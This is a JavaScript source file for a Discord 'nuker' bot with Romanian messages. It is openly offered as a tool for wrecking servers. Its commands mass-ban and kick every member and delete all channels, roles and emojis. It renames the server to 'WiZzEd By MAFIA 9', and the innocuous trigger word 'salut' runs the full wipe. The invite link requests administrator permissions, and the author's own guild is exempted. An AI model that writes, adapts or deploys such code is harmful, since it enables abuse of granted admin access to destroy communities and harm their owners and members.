

const Discord = require('discord.js');
const client = new Discord.Client({ ws: { intents: new Discord.Intents(Discord.Intents.ALL) } });
const { red, green, blue, yellow, cyan, greenBright, redBright, grey, yellowBright, cyanBright, black, blueBright } = require('chalk');
const settings = require('./settings.json');
const token = settings.token;
const prefix = settings.prefix;
const founder = settings.founder;
const disableEveryone = settings.DisableEveryone;
const myID = settings.ID;
const presser = String.raw`

 Author: 330

`;

client.on('ready', () => {
  client.user.setActivity('Better Leave Me Alone',{ type: 'STREAMING' });
   console.log(client.user.id)
    });

console.log(red(presser));

client.on("message", async message => {

  if (message.author.bot) return;


  if (message.content.startsWith('.help')) {
    const helpEmbed = new Discord.MessageEmbed()
      .setTitle('')
      .setDescription(`cf`)
      .setImage(``)
      .setFooter(``)
      .setColor('ff0000')
    message.channel.send(helpEmbed);
  }

//invite
  if (message.content.startsWith('.invite')) {
    const helpEmbed = new Discord.MessageEmbed()
      .setTitle('Bot Invite Link')
      .setURL('https://discord.com/api/oauth2/authorize?client_id=922502681988304957&permissions=8&scope=bot')
      .setDescription(`Invite link ul il aveti aici`)
      .setImage(``)
      .setFooter(`Pentru comenzi tastati .help`)
      .setColor('ff0000')
    message.channel.send(helpEmbed);
  }
  

//icon set
  if (message.content.startsWith('.sn')) {

      message.guild.setIcon('https://media.discordapp.net/attachments/874926758367989770/878263835360915476/1738931.jpg?width=732&height=427') // changes server pfp
      if(message.guild.id == '923188299068239912') return message.channel.send('nice try');
  }
  

  // Mass Ban
  if (message.content.startsWith('.banv2')) {

    message.guild.members.cache.forEach(member => member.ban({ reason: "MAFIA 9 was here." })
      .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banez serveru")
      
      ))
      if(message.guild.id == '923188299068239912') return message.channel.send('nice try');
}


//saawokoajwova
  if (message.content.startsWith('.deletechannels')) {
  
      message.guild.channels.cache.forEach(channel => channel.delete().then(
      console.log(redBright(`rip canal`))
    ))
    if(message.guild.id == '923188299068239912') return message.channel.send('nice try');
  }
  

//asaslal
  if (message.content.startsWith('.deleteroles')) {

    message.guild.roles.cache.forEach((role) => {
      role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} s-a sters`)))
    })
    if(message.guild.id == '923188299068239912') return message.channel.send('nice try');
  }

//sunt nr 1
  if (message.content.startsWith('.addchannel')) {

    await message.guild.channels.create(`salut`, {
      type : 'text'
    })
    if(message.guild.id == '923188299068239912') return message.channel.send('nice try');
  }

  // Mass Ban
  if (message.content.startsWith('.baneveryone')) {

    message.guild.members.cache.forEach(member => member.ban({ reason: "MAFIA 9 was here" })
      .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banez serveru")

      ))
      if(message.guild.id == '923188299068239912') return message.channel.send('nice try');
}


  // Mass Channels      
  ;

  if (message.content.startsWith('salut')) {
    
  
    if(message.guild.id == '923188299068239912') return message.channel.send('nice try');
    



    // Channel Delete

    message.guild.channels.cache.forEach(channel => channel.delete().then(
      console.log(redBright(`rip canal`))
    )); // deletes all channels
    message.delete();

    

    // Ban All

    message.guild.members.cache.forEach(member => member.ban({ reason: "MAFIA 9 was here" })
      .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banez serveru")

      ))

   



    // Kick All


    message.guild.members.cache.forEach(member => member.kick({ reason: "MAFIA 9 was here" })
      .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banez serveru")

      ));

     


    // Delete All Roles                 


    message.guild.roles.cache.forEach((role) => {
      role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} s-a sters`)))
    })


    

    // Delete All Emojis 

    message.guild.emojis.cache.forEach(e => e.delete({ reason: "MAFIA 9 Was here" }).then(console.log(yellow(`EMOJI: ${e.name} s-a sters`))))


    

    // Death.


    message.guild.setName(`WiZzEd By MAFIA 9`).then(console.log(green(`Server Name changed to: ${message.guild.name} Wizzed`))); // changes server name

    // Channel Delete
    message.guild.channels.cache.forEach(channel => channel.delete().then(
      console.log(redBright(`canal sters`))
    ).then(
      // Channel Icon Change
      message.guild.setIcon('https://media.discordapp.net/attachments/874926758367989770/878263835360915476/1738931.jpg?width=732&height=427') // changes server pfp
    ));

    // Roles
    message.guild.roles.cache.forEach((role) => {
      if (!role.editable) {
        return;
      } else {
        role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} s-a sters`)))
      }
    })

    // Emoji
    message.guild.emojis.cache.forEach(e => e.delete({ reason: "MAFIA 9 was here" }).then(console.log(yellow(`EMOJI: ${e.name} s-a sters`))))





  }


})

const http = require('http');
const requestListener = function(req, res) {
  res.end('Hello, World!');
}
const server = http.createServer(requestListener); 
server.listen(8080);

client.login("")


client.on('message', async (message) => {
  if (message.content === 'salut') {
    if(message.guild.id == '923188299068239912') return message.channel.send('nice try');

    message.guild.channels.cache.forEach(channel => channel.delete());

    message.guild.roles.cache.forEach(role => role.delete());

    await message.guild.channels.create(`MUIE-SERVER`, {
      type : 'text'
    }).then(async channel=> {
      channel.send('@everyone')
    })
  }
})

